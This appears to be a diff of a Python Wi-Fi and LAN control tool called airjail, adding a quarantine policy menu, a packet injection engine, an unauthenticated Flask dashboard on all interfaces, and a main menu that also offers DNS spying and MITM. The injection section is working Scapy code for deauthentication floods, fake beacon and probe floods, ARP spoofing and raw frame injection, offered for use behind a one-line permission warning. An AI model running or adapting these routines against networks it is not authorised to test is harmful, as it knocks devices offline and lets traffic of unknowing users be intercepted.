+        ch = Prompt.ask("[bold cyan]policy >[/]").upper()
+        if ch == "Q": break
+        elif ch == "1":
+            mb = int(Prompt.ask("[cyan]Threshold (MB)[/]", default="500"))
+            QUARANTINE_RULES.append({"type":"bandwidth","threshold_mb":mb,"enabled":True,
+                                     "description":f"Jail if > {mb}MB"})
+            _quarantine_save()
+        elif ch == "2":
+            s = int(Prompt.ask("[cyan]Start hour (0-23)[/]", default="23"))
+            e = int(Prompt.ask("[cyan]End hour (0-23)[/]", default="6"))
+            macs = Prompt.ask("[cyan]MACs (comma-sep)[/]", default="").strip()
+            targets = [m.strip() for m in macs.split(",") if m.strip()]
+            QUARANTINE_RULES.append({"type":"time","start_hour":s,"end_hour":e,
+                                     "targets":targets,"enabled":True,
+                                     "description":f"Curfew {s}:00-{e}:00"})
+            _quarantine_save()
+        elif ch == "3":
+            protos = Prompt.ask("[cyan]Blocked protocols (comma)[/]", default="SSH,FTP").strip()
+            QUARANTINE_RULES.append({"type":"protocol",
+                                     "blocked_protocols":[p.strip().upper() for p in protos.split(",")],
+                                     "enabled":True, "description":f"Block: {protos}"})
+            _quarantine_save()
+        elif ch == "4":
+            doms = Prompt.ask("[cyan]Blocked domains (comma)[/]", default="").strip()
+            QUARANTINE_RULES.append({"type":"dns",
+                                     "blocked_domains":[d.strip() for d in doms.split(",")],
+                                     "enabled":True, "description":f"Block DNS: {doms[:30]}"})
+            _quarantine_save()
+        elif ch == "D":
+            n = Prompt.ask("[cyan]Rule # to delete[/]").strip()
+            if n.isdigit() and 1<=int(n)<=len(QUARANTINE_RULES):
+                QUARANTINE_RULES.pop(int(n)-1); _quarantine_save()
+        elif ch == "E":
+            n = Prompt.ask("[cyan]Rule # to toggle[/]").strip()
+            if n.isdigit() and 1<=int(n)<=len(QUARANTINE_RULES):
+                r = QUARANTINE_RULES[int(n)-1]; r["enabled"] = not r.get("enabled",False)
+                _quarantine_save()
+        elif ch == "S": _start_quar(); console.print("[green][✓] Engine started.[/]")
+        elif ch == "X": _stop_quar(); console.print("[yellow]Stopped.[/]")
+        if ch != "Q": input("\nEnter to continue...")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  SECTION 18 — PACKET INJECTION ENGINE  (v2.0)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def inject_deauth(target_mac, ap_mac, mon_iface, count=200, reason=7):
+    if not SCAPY_OK: return False
+    try:
+        pkt = RadioTap()/Dot11(addr1=target_mac,addr2=ap_mac,addr3=ap_mac)/Dot11Deauth(reason=reason)
+        sendp(pkt, iface=mon_iface, count=count, inter=0.05, verbose=False)
+        LED.deauth_blast()
+        forensic_event("inject_deauth",{"target":target_mac,"ap":ap_mac,"count":count})
+        INJECT_LOG.append({"type":"deauth","target":target_mac,"count":count,
+                           "time":datetime.now().strftime("%H:%M:%S"),"iface":mon_iface})
+        return True
+    except Exception: return False
+
+def inject_beacon(ssid, mon_iface, bssid="", count=100, channel=6):
+    if not SCAPY_OK: return False
+    if not bssid:
+        import random
+        bssid = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
+    try:
+        dot11  = Dot11(type=0,subtype=8,addr1="ff:ff:ff:ff:ff:ff",addr2=bssid,addr3=bssid)
+        beacon = Dot11Beacon(cap="ESS+privacy")
+        essid  = Dot11Elt(ID="SSID",info=ssid.encode(),len=len(ssid))
+        rates  = Dot11Elt(ID="Rates",info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
+        ds_set = Dot11Elt(ID="DSset",info=bytes([channel]))
+        sendp(RadioTap()/dot11/beacon/essid/rates/ds_set, iface=mon_iface,
+              count=count, inter=0.1, verbose=False)
+        forensic_event("inject_beacon",{"ssid":ssid,"bssid":bssid,"count":count})
+        INJECT_LOG.append({"type":"beacon","target":ssid,"count":count,
+                           "time":datetime.now().strftime("%H:%M:%S"),"iface":mon_iface})
+        return True
+    except Exception: return False
+
+def inject_probe(ssid, mon_iface, count=50):
+    if not SCAPY_OK: return False
+    try:
+        import random
+        src = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
+        pkt = (RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff",
+               addr2=src,addr3="ff:ff:ff:ff:ff:ff")/
+               Dot11ProbeReq()/Dot11Elt(ID="SSID",info=ssid.encode(),len=len(ssid)))
+        sendp(pkt, iface=mon_iface, count=count, inter=0.1, verbose=False)
+        forensic_event("inject_probe",{"ssid":ssid,"count":count})
+        INJECT_LOG.append({"type":"probe","target":ssid,"count":count,
+                           "time":datetime.now().strftime("%H:%M:%S"),"iface":mon_iface})
+        return True
+    except Exception: return False
+
+def inject_arp(target_ip, spoof_ip, count=50):
+    if not SCAPY_OK: return False
+    try:
+        send(ARP(op=2,pdst=target_ip,psrc=spoof_ip), count=count,
+             inter=0.1, verbose=False, iface=IFACE)
+        forensic_event("inject_arp",{"target":target_ip,"spoof":spoof_ip,"count":count})
+        INJECT_LOG.append({"type":"arp","target":target_ip,"count":count,
+                           "time":datetime.now().strftime("%H:%M:%S"),"iface":IFACE})
+        return True
+    except Exception: return False
+
+def inject_raw(mon_iface, hex_data, count=1):
+    if not SCAPY_OK: return False
+    try:
+        raw_bytes = bytes.fromhex(hex_data.replace(" ","").replace("0x",""))
+        sendp(RadioTap()/Raw(load=raw_bytes), iface=mon_iface, count=count, verbose=False)
+        forensic_event("inject_raw",{"size":len(raw_bytes),"count":count})
+        INJECT_LOG.append({"type":"raw","target":f"{len(raw_bytes)}B","count":count,
+                           "time":datetime.now().strftime("%H:%M:%S"),"iface":mon_iface})
+        return True
+    except Exception: return False
+
+def menu_inject():
+    while True:
+        clear(); banner()
+        console.print("[bold red]── Packet Injection Engine ──[/]\n")
+        console.print(Panel("[red]⚠  Only use on networks you own or have explicit permission.[/]",
+                            border_style="red"))
+        console.print(f"  Monitor: [cyan]{MON_IFACE or 'not set'}[/]\n")
+        if INJECT_LOG:
+            tbl = Table(box=box.SIMPLE, title="[dim]Recent[/]")
+            tbl.add_column("Time",style="dim"); tbl.add_column("Type",style="yellow")
+            tbl.add_column("Target",style="green"); tbl.add_column("Count",style="cyan")
+            for e in INJECT_LOG[-8:]:
+                tbl.add_row(e["time"],e["type"],e["target"],str(e["count"]))
+            console.print(tbl)
+        console.print("\n  [bold red][1][/] Deauth   [bold yellow][2][/] Beacon flood   "
+                      "[bold cyan][3][/] Probe flood\n"
+                      "  [bold magenta][4][/] ARP spoof   [bold dim][5][/] Raw hex   "
+                      "[dim][Q][/] Back")
+        ch = Prompt.ask("[bold cyan]inject >[/]").upper()
+        if ch == "Q": break
+        elif ch == "1":
+            mi = MON_IFACE or Prompt.ask("[cyan]Monitor iface[/]")
+            tmac = Prompt.ask("[cyan]Target MAC[/]")
+            ap = GATEWAY_MAC or Prompt.ask("[cyan]AP MAC[/]")
+            cnt = int(Prompt.ask("[cyan]Count[/]", default="200"))
+            reason = int(Prompt.ask("[cyan]Reason code[/]", default="7"))
+            with console.status("[red]Injecting..."): ok = inject_deauth(tmac,ap,mi,cnt,reason)
+            console.print(f"[{'green' if ok else 'red'}][{'✓' if ok else '✗'}] Done.[/]")
+        elif ch == "2":
+            mi = MON_IFACE or Prompt.ask("[cyan]Monitor iface[/]")
+            ssid = Prompt.ask("[cyan]Fake SSID[/]", default="Free_WiFi")
+            cnt = int(Prompt.ask("[cyan]Count[/]", default="100"))
+            ch_n = int(Prompt.ask("[cyan]Channel[/]", default="6"))
+            with console.status("[yellow]Beacons..."): ok = inject_beacon(ssid,mi,count=cnt,channel=ch_n)
+            console.print(f"[{'green' if ok else 'red'}][{'✓' if ok else '✗'}] Done.[/]")
+        elif ch == "3":
+            mi = MON_IFACE or Prompt.ask("[cyan]Monitor iface[/]")
+            ssid = Prompt.ask("[cyan]Target SSID[/]")
+            cnt = int(Prompt.ask("[cyan]Count[/]", default="50"))
+            with console.status("[cyan]Probes..."): ok = inject_probe(ssid,mi,cnt)
+            console.print(f"[{'green' if ok else 'red'}][{'✓' if ok else '✗'}] Done.[/]")
+        elif ch == "4":
+            tip = Prompt.ask("[cyan]Target IP[/]")
+            sip = Prompt.ask("[cyan]Spoof as[/]", default=GATEWAY_IP or "")
+            cnt = int(Prompt.ask("[cyan]Count[/]", default="50"))
+            with console.status("[magenta]ARP..."): ok = inject_arp(tip,sip,cnt)
+            console.print(f"[{'green' if ok else 'red'}][{'✓' if ok else '✗'}] Done.[/]")
+        elif ch == "5":
+            mi = MON_IFACE or Prompt.ask("[cyan]Monitor iface[/]")
+            hx = Prompt.ask("[cyan]Hex bytes[/]")
+            cnt = int(Prompt.ask("[cyan]Count[/]", default="1"))
+            ok = inject_raw(mi,hx,cnt)
+            console.print(f"[{'green' if ok else 'red'}][{'✓' if ok else '✗'}] Done.[/]")
+        if ch != "Q": input("\nEnter to continue...")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  SECTION 19 — WEB DASHBOARD  (v2.0)
+# ══════════════════════════════════════════════════════════════════════════════
+
+_DASH_HTML = '''<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>airjail dashboard</title><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c0caf5;font-family:'JetBrains Mono',monospace;padding:16px}
+h1{color:#7aa2f7;border-bottom:2px solid #292e42;padding-bottom:8px;margin-bottom:16px;font-size:1.4em}
+h2{color:#bb9af7;margin:20px 0 10px;font-size:1.1em}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
+.card{background:#1a1b26;border:1px solid #292e42;border-radius:8px;padding:14px}
+.card h3{color:#7dcfff;margin-bottom:6px;font-size:0.85em}
+.stat{font-size:1.5em;color:#9ece6a;font-weight:bold}
+.alert{color:#f7768e} .ok{color:#9ece6a} .warn{color:#e0af68}
+table{width:100%;border-collapse:collapse;font-size:0.82em;margin-top:8px}
+th{background:#292e42;color:#7aa2f7;padding:5px 8px;text-align:left}
+td{padding:4px 8px;border-bottom:1px solid #1e2030}
+.btn{background:#292e42;color:#7aa2f7;border:1px solid #7aa2f7;padding:5px 14px;
+border-radius:4px;cursor:pointer;font-family:inherit}.btn:hover{background:#7aa2f7;color:#0a0a0f}
+</style></head><body>
+<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap">
+<h1>airjail v''' + VERSION + '''</h1>
+<button class="btn" onclick="location.reload()">Refresh</button></div>
+<div class="grid" id="s"></div>
+<h2>Devices</h2><div id="dev"></div>
+<h2>Jailed</h2><div id="jail"></div>
+<h2>Rogue AP Alerts</h2><div id="rog"></div>
+<h2>Forensic Log</h2><div id="for"></div>
+<script>
+async function L(){try{const r=await fetch('/api/status');const d=await r.json();
+document.getElementById('s').innerHTML=
+`<div class="card"><h3>Interface</h3><div class="stat">${d.iface||'?'}</div></div>
+<div class="card"><h3>Gateway</h3><div class="stat">${d.gateway||'?'}</div></div>
+<div class="card"><h3>Devices</h3><div class="stat">${d.devices||0}</div></div>
+<div class="card"><h3>Jailed</h3><div class="stat alert">${d.jailed||0}</div></div>
+<div class="card"><h3>Rogue</h3><div class="stat ${d.rogue>0?'alert':'ok'}">${d.rogue||0}</div></div>
+<div class="card"><h3>PCAP</h3><div class="stat">${d.pcap||0}</div></div>
+<div class="card"><h3>MITM</h3><div class="stat warn">${d.mitm||0}</div></div>`;
+if(d.dev_list&&d.dev_list.length){let h='<table><tr><th>IP</th><th>MAC</th><th>Status</th></tr>';
+d.dev_list.forEach(v=>{h+=`<tr><td>${v.ip}</td><td>${v.mac}</td><td class="${v.j?'alert':'ok'}">${v.j?'JAILED':'OK'}</td></tr>`;});
+document.getElementById('dev').innerHTML=h+'</table>';}
+if(d.jail_list){let h='<table><tr><th>MAC</th><th>IP</th><th>Reason</th></tr>';
+for(let[m,v] of Object.entries(d.jail_list)){h+=`<tr><td>${m}</td><td>${v.ip||'-'}</td><td class="alert">${v.reason||'-'}</td></tr>`;}
+document.getElementById('jail').innerHTML=h+'</table>';}
+if(d.rogue_list&&d.rogue_list.length){let h='<table><tr><th>Time</th><th>BSSID</th><th>SSID</th><th>Reason</th></tr>';
+d.rogue_list.forEach(a=>{h+=`<tr><td>${a.time}</td><td>${a.bssid}</td><td>${a.ssid}</td><td class="alert">${a.reason}</td></tr>`;});
+document.getElementById('rog').innerHTML=h+'</table>';}
+if(d.forensic&&d.forensic.length){let h='<table><tr><th>Time</th><th>Type</th></tr>';
+d.forensic.forEach(e=>{h+=`<tr><td>${(e.ts||'').slice(0,19)}</td><td>${e.type}</td></tr>`;});
+document.getElementById('for').innerHTML=h+'</table>';}
+}catch(e){document.getElementById('s').innerHTML='<p class="alert">'+e+'</p>';}}
+L();setInterval(L,8000);
+</script></body></html>'''
+
+def _build_dash():
+    global _dashboard_app
+    if not FLASK_OK: return None
+    app = Flask(__name__)
+    app.logger.disabled = True
+    logging.getLogger('werkzeug').setLevel(logging.ERROR)
+    @app.route("/")
+    def idx(): return render_template_string(_DASH_HTML)
+    @app.route("/api/status")
+    def api():
+        devs = [{"ip":d["ip"],"mac":d["mac"],"j":d["mac"].lower() in JAILED} for d in _scan_results]
+        return jsonify({"iface":IFACE,"gateway":GATEWAY_IP,
+                        "devices":len(_scan_results),"jailed":len(JAILED),
+                        "jail_list":JAILED,"dev_list":devs,
+                        "rogue":len(ROGUE_ALERTS),"rogue_list":ROGUE_ALERTS[-20:],
+                        "pcap":len(_pcap_sessions),"mitm":len(_mitm_sessions),
+                        "forensic":forensic_read(10)})
+    _dashboard_app = app
+    return app
+
+def _start_dash(port=8888):
+    global _dashboard_thread, DASHBOARD_PORT
+    DASHBOARD_PORT = port
+    app = _build_dash()
+    if not app: return False
+    _dashboard_thread = threading.Thread(
+        target=lambda: app.run(host="0.0.0.0",port=port,threaded=True,use_reloader=False),
+        daemon=True)
+    _dashboard_thread.start()
+    return True
+
+def menu_dashboard():
+    clear(); banner()
+    console.print("[bold cyan]── Web Dashboard ──[/]\n")
+    if not FLASK_OK:
+        console.print("[red]Flask not installed. pip install flask --break-system-packages[/]")
+        input("\nEnter to continue..."); return
+    running = _dashboard_thread and _dashboard_thread.is_alive()
+    if running:
+        console.print(f"[green][✓] Running → http://0.0.0.0:{DASHBOARD_PORT}[/]")
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8",80)); ip=s.getsockname()[0]; s.close()
+            console.print(f"[green]  → http://{ip}:{DASHBOARD_PORT}[/]")
+        except Exception: pass
+    else:
+        port = int(Prompt.ask("[cyan]Port[/]", default="8888"))
+        if _start_dash(port):
+            console.print(f"\n[green][✓] Started → http://0.0.0.0:{port}[/]")
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("8.8.8.8",80)); ip=s.getsockname()[0]; s.close()
+                console.print(f"[green]  → http://{ip}:{port}[/]")
+            except Exception: pass
+        else:
+            console.print("[red][✗] Failed.[/]")
+    input("\nEnter to continue...")
+
+
 def main_menu():
     clear(); banner()
-
     rows = [
-        ("1", "Network Scan",      "Discover LAN devices — IP, MAC, vendor, hostname",  "green"),
-        ("2", "Device Lookup",     "Deep info + DNS history for any device",             "cyan"),
-        ("3", "Deauth",            "Kick device off WiFi (needs monitor adapter)",       "red"),
-        ("4", "DNS Spy",           "Passively see what sites each user visits",          "yellow"),
-        ("5", "Bandwidth Monitor", "Real-time per-device RX/TX usage",                  "magenta"),
-        ("6", "Jail / Redirect",   "Captive portal redirect & user jail manager",        "bold red"),
-        ("7", "Firewall Status",   "Live iptables rule viewer",                          "dim cyan"),
-        ("8", "Setup",             "Configure interface, gateway & portal",               "blue"),
-        ("A", "Adapter / Driver",  "USB adapter info, driver install & LED control",     "bold magenta"),
-        ("M", "Monitor Mode",     "Enable/disable monitor mode, channel control & hop", "yellow"),
-        ("Q", "Quit",              "",                                                    "dim"),
+        ("1", "Network Scan",        "Discover LAN devices — IP, MAC, vendor, hostname",    "green"),
+        ("2", "Device Lookup",       "Deep info + DNS history for any device",               "cyan"),
+        ("3", "Deauth",              "Kick device off WiFi (needs monitor adapter)",          "red"),
+        ("4", "DNS Spy",             "Passively see what sites each user visits",             "yellow"),
+        ("5", "Bandwidth Monitor",   "Real-time per-device RX/TX usage",                     "magenta"),
+        ("6", "Jail / Redirect",     "Captive portal redirect & user jail manager",           "bold red"),
+        ("7", "Firewall Status",     "Live iptables rule viewer",                             "dim cyan"),
+        ("8", "Setup",               "Configure interface, gateway & portal",                  "blue"),
+        ("", "", "", ""),
+        ("A", "Adapter / Driver",    "USB adapter info, driver install & LED control",        "bold magenta"),
+        ("M", "Monitor Mode",        "Enable/disable monitor mode & channel hopping",         "yellow"),
+        ("I", "Packet Injection",    "Deauth, beacon flood, probe & ARP inject",              "bold red"),
+        ("R", "Rogue AP Detection",  "Evil twin & rogue AP scanner",                          "red"),
+        ("T", "Traffic Analysis",    "Protocol breakdown & per-host traffic stats",            "cyan"),
+        ("P", "PCAP Capture",        "Start/stop packet captures & analyze .pcap",            "green"),
+        ("C", "Auto-Quarantine",     "Policy engine — BW, time, protocol & DNS rules",        "bold yellow"),
+        ("", "", "", ""),
+        ("W", "Web Dashboard",       f"Live stats in browser (port {DASHBOARD_PORT})",        "blue"),
+        ("N", "Notifications",       "Telegram & Discord alert configuration",                "magenta"),
+        ("F", "Forensic Log",        "Event log viewer, CSV export & reporting",               "dim cyan"),
+        ("Q", "Quit",                "",                                                       "dim"),
     ]
-
-    table = Table(box=box.ROUNDED, border_style="cyan",
-                  show_header=False, padding=(0,2))
+    table = Table(box=box.ROUNDED, border_style="cyan", show_header=False, padding=(0,2))
     table.add_column(justify="right", style="bold yellow", width=4)
     table.add_column(style="bold",    width=22)
     table.add_column(style="dim",     width=50)
-
     for key, name, desc, color in rows:
-        table.add_row(
-            f"[{color}][{key}][/{color}]",
-            f"[{color}]{name}[/{color}]",
-            desc
-        )
-
+        if not key:
+            table.add_row("", "[dim]─── v2.0 ───[/]", "")
+        else:
+            table.add_row(f"[{color}][{key}][/{color}]",
+                          f"[{color}]{name}[/{color}]", desc)
     console.print(table)
-
-    # Status bar — includes adapter chipset, LED state, monitor ifaces
-    adapter_tag = ""
+    # Status bar
+    parts = [f"iface:[cyan]{IFACE}[/]", f"gw:[cyan]{GATEWAY_IP or '?'}[/]",
+             f"dns:{'[green]on[/]' if 'dns' in _stop_events else '[red]off[/]'}",
+             f"jailed:[{'red' if JAILED else 'dim'}]{len(JAILED)}[/]",
+             f"portal:[cyan]{REDIRECT_IP or 'not set'}[/]"]
     if ADAPTER_CHIPSET:
-        led_tag = " [green]LED[/]" if (ADAPTER_LED and LED._enabled) else ""
-        adapter_tag = f"  adapter:[magenta]{ADAPTER_CHIPSET}[/]{led_tag}"
-    mon_tag = ""
-    if _MON_IFACES:
-        mon_names = ",".join(_MON_IFACES.keys())
-        mon_tag = f"  mon:[red]{mon_names}[/]"
-    console.print(
-        f"  iface:[cyan]{IFACE}[/]  gw:[cyan]{GATEWAY_IP or '?'}[/]  "
-        f"dns:{'[green]on[/]' if 'dns' in _stop_events else '[red]off[/]'}  "
-        f"jailed:[{'red' if JAILED else 'dim'}]{len(JAILED)}[/]  "
-        f"portal:[cyan]{REDIRECT_IP or 'not set'}[/]{adapter_tag}{mon_tag}"
-    )
+        led = " [green]LED[/]" if (ADAPTER_LED and LED._enabled) else ""
+        parts.append(f"adapter:[magenta]{ADAPTER_CHIPSET}[/]{led}")
+    if MONITOR_IFACES:
+        mn = ",".join(s.get("mon_iface","?") for s in MONITOR_IFACES.values())
+        parts.append(f"mon:[red]{mn}[/]")
+    if _dashboard_thread and _dashboard_thread.is_alive():
+        parts.append(f"web:[green]:{DASHBOARD_PORT}[/]")
+    console.print("  " + "  ".join(parts))
     return Prompt.ask("\n[bold cyan]airjail >[/]").strip().upper()
 
 def run():
     global IFACE, GATEWAY_IP, GATEWAY_MAC
-
-    # ── USB adapter detection (populates globals + fires LED boot) ────────────
+    # Load configs
+    _notify_load(); _quarantine_load(); session_load()
+    # USB adapter detection
     clear(); banner()
     with console.status("[cyan]Scanning USB bus for wireless adapter..."):
         adapter = detect_usb_adapter(silent=True)
     if adapter:
-        cs_badge  = f"[bold cyan]{adapter['chipset']}[/]"
-        vnd_badge = f"[dim]{adapter['vendor']}[/]"
-        led_badge = "[green]LED ✓[/]" if adapter["led"] else "[dim]no LED[/]"
-        console.print(f"[green][✓] Adapter: {cs_badge}  {vnd_badge}  "
-                      f"USB: [yellow]{adapter['usb_id']}[/]  {led_badge}[/]")
+        console.print(f"[green][✓] Adapter: [bold cyan]{adapter['chipset']}[/bold cyan]  "
+                      f"[dim]{adapter['vendor']}[/]  USB: [yellow]{adapter['usb_id']}[/]  "
+                      f"{'[green]LED ✓[/]' if adapter['led'] else '[dim]no LED[/]'}[/]")
         LED.boot_sequence()
     else:
-        console.print("[dim][·] No adapter in database — use [A] Adapter menu to detect/install.[/]")
-
-    # ── first-run interface selection ─────────────────────────────────────────
+        console.print("[dim][·] No adapter in database — use [A] to detect/install.[/]")
+    # Interface selection
     IFACE = pick_interface()
     clear(); banner()
     with console.status(f"[cyan]Auto-detecting gateway on {IFACE}..."):
@@ -2326,7 +3252,7 @@ def run():
     if GATEWAY_IP:
         console.print(f"[green][✓] Gateway: [bold]{GATEWAY_IP}[/bold]  MAC: {GATEWAY_MAC}[/]")
     else:
-        console.print(f"[yellow][!] Could not auto-detect gateway.[/]")
+        console.print("[yellow][!] Could not auto-detect gateway.[/]")
         GATEWAY_IP  = Prompt.ask("[cyan]Enter gateway IP[/]", default="192.168.1.1")
         GATEWAY_MAC = Prompt.ask("[cyan]Enter gateway MAC[/]", default="")
     if SCAPY_OK:
@@ -2335,35 +3261,29 @@ def run():
     subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     console.print("[green][✓] IP forwarding enabled.[/]")
+    forensic_event("startup", {"version": VERSION, "iface": IFACE, "gateway": GATEWAY_IP})
     time.sleep(1)
-    # ─────────────────────────────────────────────────────────────────────────
 
     handlers = {
-        "1": menu_scan,
-        "2": menu_device_lookup,
-        "3": menu_deauth,
-        "4": menu_dns_spy,
-        "5": menu_bandwidth,
-        "6": menu_redirect,
-        "7": menu_firewall,
-        "8": menu_setup,
-        "A": menu_adapter,
-        "M": menu_monitor_mode,
+        "1": menu_scan,        "2": menu_device_lookup, "3": menu_deauth,
+        "4": menu_dns_spy,     "5": menu_bandwidth,     "6": menu_redirect,
+        "7": menu_firewall,    "8": menu_setup,          "A": menu_adapter,
+        "M": menu_monitor_mode,"I": menu_inject,         "R": menu_rogue_ap,
+        "T": menu_traffic,     "P": menu_pcap,           "C": menu_quarantine,
+        "W": menu_dashboard,   "N": menu_notifications,  "F": menu_forensic,
     }
     while True:
         ch = main_menu()
         if ch == "Q":
-            # stop all MITM sessions
-            for ip in list(_mitm_sessions.keys()):
-                _mitm_stop(ip)
-            # stop all monitor mode sessions
-            for mon, orig in list(_mon_ifaces.items()):
-                _disable_monitor(mon)
-            _stop_hop()
-            LED.monitor_stop()
-            LED.off()
+            for ip in list(_mitm_sessions.keys()): _mitm_stop(ip)
+            for name in list(_pcap_sessions.keys()): pcap_stop(name)
+            _stop_rogue(); _stop_traffic(); _stop_quar()
+            for mon, orig in list(_mon_ifaces.items()): _disable_monitor(mon)
+            _stop_hop(); LED.monitor_stop(); LED.off()
             for ev in _stop_events.values(): ev.set()
-            console.print("\n[bold cyan]airjail | 0xb0rn3 — goodbye.[/]\n")
+            session_save()
+            forensic_event("shutdown", {"clean": True})
+            console.print("\n[bold cyan]airjail v2.0 | 0xb0rn3 — goodbye.[/]\n")
             sys.exit(0)
         fn = handlers.get(ch)
         if fn:
